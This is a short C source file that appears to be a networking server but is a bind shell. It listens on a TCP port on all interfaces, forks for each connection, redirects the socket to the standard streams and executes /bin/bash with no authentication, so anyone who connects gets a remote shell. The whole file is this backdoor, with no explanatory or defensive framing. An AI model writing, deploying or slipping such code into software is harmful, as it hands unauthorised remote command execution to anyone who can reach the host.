#include "server.h"

void on_error(int descriptor, const char * error_message, int close)
{
  if(descriptor == -1)
  {
    perror(error_message);
    if(close)
      exit(EXIT_FAILURE);
  }
}

int get_tcp_socket(void)
{
  int aux = 1;
  int new_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  on_error(new_socket, "Error when creating the socket", 1);

  if((setsockopt(new_socket, SOL_SOCKET, SO_REUSEADDR, (char *) &aux, sizeof(aux)) == -1))
  { 
    perror("Failed when setting options for the socket");
    exit(7);
  }

  return new_socket;
}

void bind_tcp_port(int port, int queue)
{
  int client_socket = get_tcp_socket();
  int server_socket;
  struct sockaddr_in server_addr;
  struct sockaddr_in client_addr;
  socklen_t accept_struct_size = sizeof(struct sockaddr_in);
  int aux = 1;

  memset(&server_addr, 0, sizeof(server_addr));
  memset(&client_addr, 0, sizeof(client_addr));

  server_socket = socket(AF_INET, SOCK_STREAM, 0);
  on_error(server_socket, "Error when creating the socket", 1);
  
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(port);
  server_addr.sin_addr.s_addr = htonl(INADDR_ANY);

  if(bind(server_socket, (struct sockaddr * ) &server_addr, sizeof(server_addr)) == -1)
  {
    perror("Failed when calling bind syscall");
    exit(1);
  }

  if((listen(server_socket, queue)) == -1)
  {
    perror("Failed when calling listen syscall");
    exit(3);
  }
  
  printf("[*] Waiting for incoming connection on 0.0.0.0 at port %d\n", port);
  fflush(stdout);

  while(TRUE)
  {
    client_socket = accept(server_socket, (struct sockaddr *) &client_addr, &accept_struct_size);
    if(!fork())
    {
      on_error(client_socket, "Error when accepting connection", 1);
      printf("Connection received from %s in port %d managed by the process %d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port), getpid());
      dup2(client_socket,0); dup2(client_socket,1); dup2(client_socket,2);
      execve("/bin/bash", NULL, NULL);
    }
  } //end while
}

